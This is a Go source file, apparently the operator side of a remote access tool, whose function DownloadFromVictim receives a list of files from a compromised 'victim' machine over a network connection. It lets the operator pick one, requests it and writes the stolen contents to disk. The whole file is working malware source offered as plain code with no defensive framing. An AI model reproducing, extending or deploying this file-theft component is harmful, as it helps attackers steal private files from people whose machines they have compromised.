package download

import (
	"bufio"
	"encoding/gob"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
)

type FilesList struct {
	Files []string
}

type Data struct {
	FileName    string
	FileSize    int
	FileContent []byte
}

func DownloadFromVictim(connection net.Conn) (err error) {
	fileStruct := &FilesList{}
	dec := gob.NewDecoder(connection)
	err = dec.Decode(fileStruct)

	for index, fileName := range fileStruct.Files {
		fmt.Println("\t", index, "\t", fileName)
	}

	fmt.Println("[+] select file: ")
	reader := bufio.NewReader(os.Stdin)

	user_input_raw, err := reader.ReadString('\n')

	user_input := strings.TrimSuffix(user_input_raw, "\n")

	file_index, _ := strconv.Atoi(user_input)

	FileName := fileStruct.Files[file_index]

	nbyte, err := connection.Write([]byte(FileName + "\n"))
	fmt.Println("[+] File name sent :", nbyte)

	decoder := gob.NewDecoder(connection)
	fs := &Data{}

	err = decoder.Decode(fs)

	file, err := os.Create(fs.FileName)

	nbytes, err := file.Write(fs.FileContent)
	fmt.Println("[+] File downloaded successfully , ", nbytes)

	return
}
